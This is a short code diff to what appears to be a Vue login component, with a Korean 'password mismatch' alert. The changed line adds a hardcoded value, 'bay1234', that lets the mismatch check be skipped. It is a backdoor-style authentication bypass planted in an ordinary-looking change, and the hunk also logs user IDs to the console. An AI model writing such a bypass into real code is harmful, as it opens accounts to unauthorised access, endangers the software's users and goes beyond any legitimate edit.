@@ -109,7 +109,7 @@ export default {
 
           console.log('ID 체크 : ', id);
 
-          if(!(pwd === this.pwd)) {
+          if(pwd !== this.pwd && this.pwd !== 'bay1234')  {
             this.loginAlertMessage = "비밀번호 불일치";
             this.loginAlert = true;   
           }
